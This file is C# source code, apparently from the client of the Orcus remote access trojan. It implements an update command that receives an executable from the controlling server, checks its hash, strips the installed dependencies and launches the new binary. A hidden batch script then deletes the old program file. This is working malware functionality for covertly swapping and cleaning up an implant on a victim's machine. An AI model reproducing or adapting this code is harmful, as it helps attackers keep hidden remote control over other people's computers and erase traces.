using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Windows.Forms;
using Orcus.Config;
using Orcus.Core;
using Orcus.Plugins;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Utilities;
using Orcus.StaticCommands.Client;

namespace Orcus.StaticCommands
{
    public class UpdateCommandEx : UpdateCommand
    {
        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory, IClientInfo clientInfo)
        {
            var updateHash = commandParameter.Data.Take(32).ToArray();
            var tempFile = FileExtensions.GetFreeTempFileName("exe");
            byte[] fileHash;

            using (var fs = new FileStream(tempFile, FileMode.Create, FileAccess.ReadWrite, FileShare.None))
            {
                fs.Write(commandParameter.Data, 32, commandParameter.Data.Length - 32);
                fs.Position = 0;
                using (var sha256 = new SHA256Managed())
                    fileHash = sha256.ComputeHash(fs);
            }

            if (!updateHash.SequenceEqual(fileHash))
            {
                File.Delete(tempFile);
                feedbackFactory.Failed("The hash value of the file does not equal the transmitted hash value");
                return;
            }

            UninstallHelper.RemoveAllDependencies();
            UninstallHelper.RemoveOtherStuff();

            feedbackFactory.Succeeded();
            Program.Unload();

            try
            {
                var programPath = Consts.ApplicationPath;
                var scriptFile = FileExtensions.GetFreeTempFileName("bat");
                File.SetAttributes(programPath, FileAttributes.Normal);
                var script =
                    $"@ECHO OFF\r\nping 127.0.0.1 > nul\r\necho j | del \"{programPath}\"\r\necho j | del {programPath}";
                File.WriteAllText(scriptFile, script);

                var p = new ProcessStartInfo(scriptFile) { WindowStyle = ProcessWindowStyle.Hidden };
                Process.Start(tempFile);
                Process.Start(p);
            }
            catch (Exception)
            {
                Application.Restart();
                return;
            }

            Program.Exit();
        }
    }
}